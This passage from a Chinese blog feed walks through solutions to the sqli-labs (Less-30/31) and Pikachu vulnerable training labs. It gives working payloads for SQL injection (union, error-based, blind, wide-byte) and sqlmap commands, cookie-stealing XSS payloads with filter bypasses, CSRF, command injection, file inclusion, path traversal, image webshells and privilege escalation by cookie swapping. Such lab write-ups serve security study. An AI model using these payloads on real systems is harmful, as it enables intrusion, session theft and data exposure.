这里显示是正常的，4的时候是不正常的，但是显示异常并没有显示报错的信息。说明无法使用报错注入。</span><br><span class="line">2. 接下里和less29相同</span><br><span class="line">3. http://127.0.0.1:8080/sqli_/Less-30/index.jsp?id=1&amp;id=11111&quot; union select 1,2, 3--+</span><br><span class="line">4. http://127.0.0.1:8080/sqli_/Less-30/index.jsp?id=1&amp;id=11111&quot; union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  接下来就是常规操作了。</span><br></pre></td></tr></table></figure><h1 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1:8080/sqli_/Less-31/index.jsp?id=1&amp;id=-1 &quot;) union select 1,2,3 --+ </span><br><span class="line">2. http://127.0.0.1:8080/sqli_/Less-31/index.jsp?id=1&amp;id=-1 &quot;) union select 1,2,group_concat(schema_name) from    information_schema.schemata --+   </span><br><span class="line"></span><br><span class="line">操作和前面的基本相同</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu-靶场</title>
      <link href="/archives/9434f5cf.html"/>
      <url>/archives/9434f5cf.html</url>
      
        <content type="html"><![CDATA[<h1 id="系统介绍"><a href="#系统介绍" class="headerlink" title="系统介绍"></a>系统介绍</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Pikachu上的漏洞类型列表如下：</span><br><span class="line">    Burt Force(暴力破解漏洞)</span><br><span class="line">    XSS(跨站脚本漏洞)</span><br><span class="line">    CSRF(跨站请求伪造)</span><br><span class="line">    SQL-Inject(SQL注入漏洞)</span><br><span class="line">    RCE(远程命令/代码执行)</span><br><span class="line">    Files Inclusion(文件包含漏洞)</span><br><span class="line">    Unsafe file downloads(不安全的文件下载)</span><br><span class="line">    Unsafe file uploads(不安全的文件上传)</span><br><span class="line">    Over Permisson(越权漏洞)</span><br><span class="line">    ../../../(目录遍历)</span><br><span class="line">    I can see your ABC(敏感信息泄露)</span><br><span class="line">    PHP反序列化漏洞</span><br><span class="line">    XXE(XML External Entity attack)</span><br><span class="line">    不安全的URL重定向</span><br><span class="line">    SSRF(Server-Side Request Forgery)</span><br><span class="line">    More...(找找看?..有彩蛋!)</span><br><span class="line">    管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~</span><br><span class="line">    后续会持续更新一些新的漏洞进来,也欢迎你提交漏洞案例给我,最新版本请关注pikachu</span><br></pre></td></tr></table></figure><h3>少就是多,慢就是快</h3>## 基于表单的暴力破解* 随便填用户名和密码之后用burp抓包，用常用字典直接爆破即可。* 将响应包按长度排序## 验证码绕过（on server）* 填入正确的用户名、密码和验证码进行重放攻击测试* 经测试发现，该验证码虽在后端验证，但能重复使用。* 于是可以用正确的验证码的包来进行用户名和密码的爆破。<h2 id="验证码绕过（client）"><a href="#验证码绕过（client）" class="headerlink" title="验证码绕过（client）"></a>验证码绕过（client）</h2><ul><li>第一种方法可以按照上面绕过服务器端验证的方法绕过</li><li>第二种方法：<br>由于是在客户端验证的，所以尝试将请求中的验证码参数部分去掉然后进行重放，发现依然可以登陆成功。<br>于是选择使用删掉验证码字段的请求包进行用户名和密码的爆破。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var code; //在全局 定义验证码</span><br><span class="line">    function createCode() &#123;</span><br><span class="line">        code = &quot;&quot;;</span><br><span class="line">        var codeLength = 5;//验证码的长度</span><br><span class="line">        var checkCode = document.getElementById(&quot;checkCode&quot;);</span><br><span class="line">        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;);//所有候选组成验证码的字符，当然也可以用中文的</span><br><span class="line"></span><br><span class="line">        for (var i = 0; i &lt; codeLength; i++) &#123;</span><br><span class="line">            var charIndex = Math.floor(Math.random() * 36);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        //alert(code);</span><br><span class="line">        if (checkCode) &#123;</span><br><span class="line">            checkCode.className = &quot;code&quot;;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function validate() &#123;</span><br><span class="line">        var inputCode = document.querySelector(&#x27;#bf_client .vcode&#x27;).value;</span><br><span class="line">        if (inputCode.length &lt;= 0) &#123;</span><br><span class="line">            alert(&quot;请输入验证码！&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else if (inputCode != code) &#123;</span><br><span class="line">            alert(&quot;验证码输入错误！&quot;);</span><br><span class="line">            createCode();//刷新验证码</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><ul><li>操作很麻烦 暂略<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2></li><li>输入框有字符限制</li><li>按<code>F12</code>修改限制</li><li>输入<code>&lt;Script&gt;alert(1)&lt;/Script&gt;</code><h2 id="反射性xss-post"><a href="#反射性xss-post" class="headerlink" title="反射性xss(post)"></a>反射性xss(post)</h2></li><li>登陆后</li><li>bp抓包</li><li>修改<code>message</code>的内容<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2></li><li>演示存储型xss</li><li>直接写入xss脚本</li><li>不删除的话会一直存在<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;xssd_main&quot;&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    function domxss()&#123;</span><br><span class="line">                        var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">                        document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    //试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">                    //试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br><span class="line">                &lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2></li><li>从url来获取<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;xssd_main&quot;&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    function domxss()&#123;</span><br><span class="line">                        var str = window.location.search;</span><br><span class="line">                        var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span><br><span class="line">                        var xss = txss.replace(/\+/g,&#x27; &#x27;);</span><br><span class="line">//                        alert(xss);</span><br><span class="line"></span><br><span class="line">                        document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+xss+&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    //试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">                    //试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br><span class="line">                &lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提交后我们输入的内容不会在前对输出，而是提交到了后台，可能管理员会去看。如果我们输入一个JS代码，管理员登录后台管理界面，如果后台把我们的内容输出，那后台管理员可能遭受到我们的XSS攻击。</p><h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写，比如&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</span><br><span class="line">双写（拼凑），&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;。后台可能把&lt;script&gt;标签去掉换，但可能只去掉一次。</span><br><span class="line">注释干扰，&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。加上注释后可能可以绕过后台过滤机制。</span><br></pre></td></tr></table></figure><ul><li>pikachu：<code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/sCRIpt&gt;</code>，发现后端只对小写的script进行过滤。</li></ul><p>当然，由于它只过滤小写的script标签，那么换一种payload也是可以绕过的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">预定义的字符是</span><br><span class="line">&amp; 成为 &amp;amp</span><br><span class="line">&quot; 成为 &amp;quot</span><br><span class="line">&#x27; 成为 &amp;#039</span><br><span class="line">&lt; 成为 &amp;lt</span><br></pre></td></tr></table></figure><p>可用引号类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENT_COMPAT：默认，仅编码双引号</span><br><span class="line">ENT_QUOTES：编码双引号和单引号</span><br><span class="line">ENT_NOQUOTES：不编码任何引号</span><br></pre></td></tr></table></figure><hr><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onmouseover=&#x27;alert(document.cookie)&#x27;</span><br></pre></td></tr></table></figure><h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;img src=x onerror=alert(document.cookie)&gt;)</span><br></pre></td></tr></table></figure><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><ul><li>随便登录一个账户然后选择修改个人信息并抓包。</li><li>然后即可根据包中数据构造钓鱼链接，发给受害者，在他保持登录状态的情况下，会将对应字段的信息改成攻击者设置好的内容。<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2>同样地，先登录。<br>修改个人信息，然后抓包。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=girl&amp;phonenum=12345678922&amp;add=usa&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure></li></ul><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>按照前面csrf get的方法，攻击者会伪造一个GET URL去让用户点击。但用户正常提供GET请求时，会把服务器返回的token填入和提交，而攻击者伪造URL时除非前期抓包获取到这个返回的token，否则他是不会知道这个token的。所以攻击者无法构造GET URL。同理，对于POST方法也是一样。<br>所以，使用token是一个很好的防御CSRF攻击的方法。</p><h1 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2 UNION SELECT 1,database()  --&amp;submit=%E6%9F%A5%E8%AF%A2 </span><br></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; or 1=1 #</span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>查看后端代码，多除了括号，我们还是进行闭合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or 1=1 #，查看结果。</span><br></pre></td></tr></table></figure><h2 id="insert-x2F-update注入"><a href="#insert-x2F-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h2><p>注册用户名处 或者 修改个人信息处：<br>payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weiss&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先任意提交</span><br><span class="line">删除，抓包/pikachu-master/vul/sqli/sqli_del.php?id=59</span><br><span class="line">59之后添加or updatexml(1,concat(0x7e,datebase()),0)</span><br><span class="line">用加号连接：id=60+or+updatexml(1,concat(0x7e,datebase()),0)</span><br></pre></td></tr></table></figure><h2 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&#x27;or updatexml (1,concat(0x7e,datebase()),0) or &#x27;</span><br><span class="line"></span><br><span class="line">Cookie:ant[uname]=admin&#x27;or updatexml (1,concat(0x7e,datebase()),0) or &#x27;;</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">boolian</span><br><span class="line">手工注入：</span><br><span class="line">name=lucy&#x27; and length(database())=7-- -</span><br><span class="line">判断数据库的长度是7，查看burpsuite响应的render</span><br><span class="line">实为pikachu，正好7位</span><br><span class="line"></span><br><span class="line">sqlmap直接跑：</span><br><span class="line">python sqlmap.py -u &quot;http://x.x.x.x/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; --dbs</span><br><span class="line"></span><br><span class="line">time</span><br><span class="line">payload：kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br><span class="line">根据响应时间来判断是否正确。</span><br><span class="line">sqlmap：</span><br><span class="line">python sqlmap.py -u &quot;http://x.x.x.x/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; --dbs</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先用name=1%df&#x27; union select 1,2#判断注入位置和有无回显</span><br><span class="line">之后就按照正常注入流程即可，原理是利用GBK绕过前端对单引号添加的转义符。</span><br></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><ul><li>正常输入IP <code>127.0.0.1</code></li><li>测试 <code>127.0.0.1 &amp; ipconfig</code><h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_local.php?filename=file2.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_local.php?filename=file3.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_local.php?filename=file4.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../../(目录)&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远程文件包含漏洞形式跟本地文件包含漏洞差不多，在远程包含漏洞中，攻击着可以通过访问外部地址来加载远程的代码。<br>远程包含漏洞前提：如果使用的lincldue和require，则需要php.ini配置如下（php5.4.34）：<br>allow_url_fopem&#x3D;on    &#x2F;默认打开<br>Allow_url_include&#x3D;on  &#x2F;默认关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.169.204/pikachu/vul/fileinclude/fi_remote.php?filename= http://192.168.169.204/pikachu/test/yijuhua.txt  &amp;submit=提交查询</span><br></pre></td></tr></table></figure><h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><h2 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../(目录)</span><br></pre></td></tr></table></figure><h1 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h1><h2 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h2><ul><li>web编辑器修改<code>onchange</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input class=&quot;uploadfile&quot; type=&quot;file&quot; name=&quot;uploadfile&quot; onchange=&quot;checkFileExt(this.value)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input class=&quot;uploadfile&quot; type=&quot;file&quot; name=&quot;uploadfile&quot; onchange=&quot; &quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h2><ul><li>mime: <a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></li><li>bp抓包修改Content-Type: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2></li><li>图片码</li><li>制作<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd中 copy 1.jpg/b+2.php 3.jpg</span><br></pre></td></tr></table></figure><h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1></li><li>越权漏洞概述</li><li>由于没有用户权限进行严格的判断</li><li>导致低权限的账号（比如普通用户）可以去完成高权限账号（比如超级管理员）范围内的操作。</li><li>平行越权：A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作</li><li>垂直越权：A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</li><li>越权漏洞属于逻辑漏洞，是由于权限校验的逻辑不够严谨导致。</li><li>每个应用系统其用户对应的权限是根据其业务功能我划分的，而每个企业的业务又都是不一样的。</li><li>因此越权漏洞很难通过扫描工具发现出来，往往需要通过手动进行测试。<h2 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF#</span><br></pre></td></tr></table></figure></li><li>直接在链接替换人名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF#</span><br></pre></td></tr></table></figure></li></ul><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><ul><li><p>登录管理员账号,创建账号</p></li><li><p>bp抓包</p></li><li><p>在登陆普通用户</p></li><li><p>bp抓包获取cookie</p></li><li><p>把普通用户的cookie替换管理员的cookie</p></li><li><p>重放 就创建两条的用户信息</p></li></ul><h1 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/dir/dir_list.php?title=jarheads.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/dir/dir_list.php?title=../../../../../../</span><br></pre></td></tr></table></figure><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><ul><li>前端源代码 可能有信息</li><li>cookie</li><li>网站目录信息</li></ul><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 